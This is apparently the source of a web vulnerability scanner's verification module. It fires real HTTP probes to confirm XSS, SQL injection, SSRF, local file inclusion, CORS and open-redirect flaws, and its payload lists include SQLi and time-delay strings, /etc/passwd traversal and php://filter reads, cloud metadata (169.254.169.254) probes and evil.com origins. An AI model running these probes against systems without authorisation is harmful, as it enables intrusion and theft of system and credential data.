"""
TheMasterRecon HTTP Verifier — Autonomous Finding Confirmation
Beats xbow by actually PROVING vulnerabilities with real HTTP probes.
No more "maybe vulnerable" — we show you the actual exfiltrated data.
"""
import re, ssl, time, logging, urllib.request, urllib.parse, socket
from typing import Optional, Dict, List, Tuple

log = logging.getLogger("elite.http_verify")

def _ssl_ctx():
    c = ssl.create_default_context()
    c.check_hostname = False
    c.verify_mode    = ssl.CERT_NONE
    return c

def _get(url: str, headers: dict = None, timeout: int = 8) -> Tuple[int, str, dict]:
    """Simple GET — returns (status_code, body, response_headers)."""
    try:
        req = urllib.request.Request(url, headers=headers or {
            "User-Agent": "Mozilla/5.0 (compatible; SecurityScanner/1.0)",
        })
        with urllib.request.urlopen(req, timeout=timeout, context=_ssl_ctx()) as r:
            body = r.read(8192).decode('utf-8', 'ignore')
            hdrs = dict(r.headers)
            return r.status, body, hdrs
    except urllib.error.HTTPError as e:
        try: body = e.read(2048).decode('utf-8','ignore')
        except: body = ""
        return e.code, body, {}
    except Exception as e:
        log.debug(f"[verify] GET {url}: {e}")
        return 0, "", {}

def _post(url: str, data: str, headers: dict = None, timeout: int = 8) -> Tuple[int, str, dict]:
    """Simple POST — returns (status_code, body, response_headers)."""
    try:
        h = {"User-Agent": "Mozilla/5.0 (compatible; SecurityScanner/1.0)",
             "Content-Type": "application/x-www-form-urlencoded"}
        if headers: h.update(headers)
        body_bytes = data.encode() if isinstance(data, str) else data
        req = urllib.request.Request(url, data=body_bytes, headers=h)
        with urllib.request.urlopen(req, timeout=timeout, context=_ssl_ctx()) as r:
            body = r.read(8192).decode('utf-8', 'ignore')
            return r.status, body, dict(r.headers)
    except urllib.error.HTTPError as e:
        try: body = e.read(2048).decode('utf-8','ignore')
        except: body = ""
        return e.code, body, {}
    except Exception as e:
        log.debug(f"[verify] POST {url}: {e}")
        return 0, "", {}


def verify_xss(url: str, param: str = "", payload: str = "") -> dict:
    """
    Verify XSS by checking if payload reflects unescaped in response.
    Returns: {confirmed, evidence, payload_used, reflection_context}
    """
    TEST_PAYLOADS = [
        '<tmr-xss-test>',
        '"><tmr-xss-test>',
        "'><tmr-xss-test>",
        '<ScRiPt>tmrXSStest()</ScRiPt>',
    ]
    payload_to_use = payload or TEST_PAYLOADS[0]

    # Build test URL
    try:
        parsed  = urllib.parse.urlparse(url)
        params  = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not params:
            return {"confirmed": False, "evidence": "No parameters found", "payload_used": payload_to_use}

        test_param = param or list(params.keys())[0]

        for pload in (([payload] if payload else []) + TEST_PAYLOADS):
            test_params = dict(params)
            test_params[test_param] = [pload]
            new_qs  = urllib.parse.urlencode(test_params, doseq=True)
            test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))

            status, body, hdrs = _get(test_url)
            if status == 0:
                continue

            # Check if payload reflects unescaped
            if pload in body:
                # Is it actually unescaped?
                escaped_versions = [
                    pload.replace('<','&lt;').replace('>','&gt;'),
                    pload.replace('<','\\u003c').replace('>','\\u003e'),
                    pload.replace('<','%3C').replace('>','%3E'),
                ]
                if not any(ev in body for ev in escaped_versions):
                    # Find context
                    idx = body.find(pload)
                    context = body[max(0,idx-50):idx+len(pload)+50]
                    return {
                        "confirmed":          True,
                        "evidence":           f"Payload reflected unescaped in response",
                        "payload_used":       pload,
                        "reflection_context": context,
                        "test_url":           test_url,
                        "response_code":      status,
                        "severity":           "high",
                    }

    except Exception as e:
        log.debug(f"[verify_xss] {e}")

    return {"confirmed": False, "evidence": "Payload not reflected or properly escaped", "payload_used": payload_to_use}


def verify_sqli(url: str, param: str = "") -> dict:
    """
    Verify SQL injection using time-based and error-based detection.
    """
    try:
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not params:
            return {"confirmed": False, "evidence": "No parameters"}

        test_param = param or list(params.keys())[0]

        # Error-based payloads
        ERROR_PAYLOADS = ["'", "''", "' OR '1'='1", "1 AND 1=CONVERT(int,@@version)--"]
        SQL_ERRORS = [
            "sql syntax", "mysql_fetch", "ORA-", "syntax error",
            "unclosed quotation", "quoted string not properly terminated",
            "postgresql", "sqlite_error", "SQLSTATE", "mysql_num_rows",
            "You have an error in your SQL", "Warning: mysql",
            "supplied argument is not a valid MySQL", "Column count doesn't match",
        ]

        for payload in ERROR_PAYLOADS:
            test_params = dict(params)
            test_params[test_param] = [payload]
            new_qs   = urllib.parse.urlencode(test_params, doseq=True)
            test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))

            status, body, _ = _get(test_url)
            body_lower = body.lower()

            for err in SQL_ERRORS:
                if err.lower() in body_lower:
                    idx = body_lower.find(err.lower())
                    context = body[max(0,idx-30):idx+100]
                    return {
                        "confirmed":     True,
                        "evidence":      f"SQL error detected: '{err}'",
                        "payload_used":  payload,
                        "error_context": context.strip(),
                        "test_url":      test_url,
                        "response_code": status,
                        "severity":      "critical",
                    }

        # Time-based (5 second sleep)
        TIME_PAYLOADS = [
            "' AND SLEEP(5)--",
            "' AND 1=CONVERT(int,(SELECT CHAR(88)+CHAR(88)+CHAR(88)))--",
            "; SELECT pg_sleep(5)--",
            "' OR SLEEP(5)#",
        ]
        for payload in TIME_PAYLOADS:
            test_params = dict(params)
            test_params[test_param] = [payload]
            new_qs   = urllib.parse.urlencode(test_params, doseq=True)
            test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))

            t0     = time.time()
            status, body, _ = _get(test_url, timeout=10)
            elapsed = time.time() - t0

            if elapsed >= 4.5 and status != 0:
                return {
                    "confirmed":     True,
                    "evidence":      f"Time-based SQLi: {elapsed:.1f}s delay detected",
                    "payload_used":  payload,
                    "delay_seconds": round(elapsed, 1),
                    "test_url":      test_url,
                    "response_code": status,
                    "severity":      "critical",
                }

    except Exception as e:
        log.debug(f"[verify_sqli] {e}")

    return {"confirmed": False, "evidence": "No SQL error or time delay detected"}


def verify_ssrf(url: str, param: str = "", oob_host: str = "") -> dict:
    """
    Verify SSRF by testing AWS metadata endpoint reachability.
    (Actually tests if response contains AWS metadata indicators)
    """
    try:
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not params:
            return {"confirmed": False, "evidence": "No parameters"}

        test_param = param or list(params.keys())[0]

        # Test internal targets
        SSRF_TARGETS = [
            ("http://169.254.169.254/latest/meta-data/", ["ami-id", "instance-id", "hostname"]),
            ("http://169.254.169.254/", ["169.254.169.254", "latest", "meta-data"]),
            ("http://127.0.0.1/", ["localhost", "127.0.0.1"]),
            ("http://[::1]/", ["localhost"]),
        ]

        for target_url, indicators in SSRF_TARGETS:
            test_params = dict(params)
            test_params[test_param] = [target_url]
            new_qs   = urllib.parse.urlencode(test_params, doseq=True)
            test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))

            status, body, hdrs = _get(test_url)
            if status in (200, 301, 302) and any(ind in body for ind in indicators):
                matched = next(ind for ind in indicators if ind in body)
                idx = body.find(matched)
                context = body[max(0,idx-20):idx+100]
                return {
                    "confirmed":      True,
                    "evidence":       f"SSRF confirmed: internal target '{target_url}' responded",
                    "ssrf_target":    target_url,
                    "response_excerpt": context.strip(),
                    "test_url":       test_url,
                    "response_code":  status,
                    "severity":       "critical",
                }

        # Check for any private IP response
        for target in ["http://192.168.1.1/", "http://10.0.0.1/"]:
            test_params = dict(params)
            test_params[test_param] = [target]
            new_qs   = urllib.parse.urlencode(test_params, doseq=True)
            test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
            status, body, _ = _get(test_url)
            if status in (200, 201) and len(body) > 10:
                return {
                    "confirmed":     True,
                    "evidence":      f"SSRF: internal host {target} responded with {len(body)} bytes",
                    "ssrf_target":   target,
                    "test_url":      test_url,
                    "response_code": status,
                    "severity":      "critical",
                }

    except Exception as e:
        log.debug(f"[verify_ssrf] {e}")

    return {"confirmed": False, "evidence": "No internal host response detected"}


def verify_lfi(url: str, param: str = "") -> dict:
    """Verify LFI by checking for /etc/passwd content in response."""
    LFI_PAYLOADS = [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "php://filter/convert.base64-encode/resource=/etc/passwd",
    ]
    PASSWD_INDICATORS = ["root:x:0:0", "root:0:0", "/bin/bash", "/bin/sh",
                         "daemon:x:", "nobody:x:"]
    try:
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not params:
            return {"confirmed": False, "evidence": "No parameters"}

        test_param = param or list(params.keys())[0]

        for payload in LFI_PAYLOADS:
            test_params = dict(params)
            test_params[test_param] = [payload]
            new_qs   = urllib.parse.urlencode(test_params, doseq=True)
            test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))

            status, body, _ = _get(test_url)

            # Check for base64 encoded passwd
            if "base64" in payload.lower():
                import base64
                try:
                    # Find base64 block in response
                    b64_match = re.search(r'[A-Za-z0-9+/]{50,}={0,2}', body)
                    if b64_match:
                        decoded = base64.b64decode(b64_match.group()).decode('utf-8','ignore')
                        if any(ind in decoded for ind in PASSWD_INDICATORS):
                            return {
                                "confirmed":     True,
                                "evidence":      "LFI confirmed: /etc/passwd read via base64 filter",
                                "file_content":  decoded[:200],
                                "payload_used":  payload,
                                "test_url":      test_url,
                                "severity":      "critical",
                            }
                except Exception:
                    pass

            for indicator in PASSWD_INDICATORS:
                if indicator in body:
                    idx = body.find(indicator)
                    return {
                        "confirmed":    True,
                        "evidence":     f"LFI confirmed: /etc/passwd content found in response",
                        "file_excerpt": body[max(0,idx-5):idx+100].strip(),
                        "payload_used": payload,
                        "test_url":     test_url,
                        "severity":     "critical",
                    }

    except Exception as e:
        log.debug(f"[verify_lfi] {e}")

    return {"confirmed": False, "evidence": "No file content detected in response"}


def verify_cors(url: str) -> dict:
    """Verify CORS misconfiguration by sending Origin header."""
    test_origins = [
        "https://evil.com",
        "https://attacker.tmr.com",
        "null",
    ]
    try:
        for origin in test_origins:
            status, body, hdrs = _get(url, headers={
                "Origin": origin,
                "User-Agent": "Mozilla/5.0 (compatible; SecurityScanner/1.0)",
            })
            acao = hdrs.get("Access-Control-Allow-Origin","") or hdrs.get("access-control-allow-origin","")
            acac = hdrs.get("Access-Control-Allow-Credentials","") or hdrs.get("access-control-allow-credentials","")

            if acao == origin or acao == "*":
                severity = "high"
                if acac.lower() == "true" and acao != "*":
                    severity = "critical"  # With credentials = critical
                return {
                    "confirmed":     True,
                    "evidence":      f"CORS: Origin '{origin}' reflected in ACAO header",
                    "acao_header":   acao,
                    "acac_header":   acac,
                    "test_origin":   origin,
                    "severity":      severity,
                }
    except Exception as e:
        log.debug(f"[verify_cors] {e}")

    return {"confirmed": False, "evidence": "CORS headers properly configured"}


def verify_redirect(url: str, param: str = "") -> dict:
    """Verify open redirect by checking Location header."""
    REDIRECT_PAYLOADS = [
        "https://evil.tmr-test.com",
        "//evil.tmr-test.com",
        "/\\evil.tmr-test.com",
    ]
    try:
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        test_param = param or list(params.keys())[0] if params else None
        if not test_param:
            return {"confirmed": False, "evidence": "No parameters"}

        for payload in REDIRECT_PAYLOADS:
            test_params = dict(params)
            test_params[test_param] = [payload]
            new_qs   = urllib.parse.urlencode(test_params, doseq=True)
            test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))

            # Don't follow redirects - check Location header directly
            try:
                req = urllib.request.Request(test_url, headers={
                    "User-Agent": "Mozilla/5.0 (compatible; SecurityScanner/1.0)"
                })
                # urllib follows redirects by default, so we use a custom opener
                opener = urllib.request.build_opener(urllib.request.HTTPRedirectHandler())
                # Actually just check for redirect without following
                import http.client
                purl = urllib.parse.urlparse(test_url)
                conn = http.client.HTTPSConnection(purl.netloc, timeout=5, context=_ssl_ctx()) if purl.scheme=='https' else http.client.HTTPConnection(purl.netloc, timeout=5)
                path = purl.path + ('?'+purl.query if purl.query else '')
                conn.request("GET", path, headers={"User-Agent":"SecurityScanner/1.0"})
                resp = conn.getresponse()
                if resp.status in (301,302,303,307,308):
                    location = resp.getheader("Location","")
                    if "evil.tmr-test.com" in location or payload in location:
                        return {
                            "confirmed":     True,
                            "evidence":      f"Open redirect: Location header points to '{location}'",
                            "location":      location,
                            "payload_used":  payload,
                            "test_url":      test_url,
                            "response_code": resp.status,
                            "severity":      "medium",
                        }
                conn.close()
            except Exception:
                pass

    except Exception as e:
        log.debug(f"[verify_redirect] {e}")

    return {"confirmed": False, "evidence": "No unvalidated redirect detected"}


def verify_finding(finding: dict, oob_host: str = "") -> dict:
    """
    Master verification function — dispatches to correct verifier.
    Returns enriched finding with confirmation data.
    """
    bug  = finding.get("bug","").lower()
    url  = finding.get("url","")
    param = finding.get("param","")

    if not url:
        return {**finding, "verified": False, "verify_evidence": "No URL"}

    VERIFIERS = {
        "xss":      lambda: verify_xss(url, param),
        "sqli":     lambda: verify_sqli(url, param),
        "ssrf":     lambda: verify_ssrf(url, param, oob_host),
        "lfi":      lambda: verify_lfi(url, param),
        "cors":     lambda: verify_cors(url),
        "redirect": lambda: verify_redirect(url, param),
        "stored_xss": lambda: verify_xss(url, param),
    }

    verifier = VERIFIERS.get(bug)
    if not verifier:
        return {**finding, "verified": None, "verify_evidence": f"No verifier for {bug}"}

    try:
        result = verifier()
        enriched = {
            **finding,
            "verified":        result.get("confirmed", False),
            "verify_evidence": result.get("evidence",""),
            "verify_payload":  result.get("payload_used",""),
            "verify_url":      result.get("test_url", url),
        }
        if result.get("confirmed"):
            # Boost confidence on verification
            enriched["confidence"] = min(99, finding.get("confidence",50) + 25)
            # Override severity if verifier says higher
            if result.get("severity") == "critical" and finding.get("severity") != "critical":
                enriched["severity_override"] = "critical"
        return enriched
    except Exception as e:
        log.debug(f"[verify] {bug}: {e}")
        return {**finding, "verified": None, "verify_evidence": str(e)}
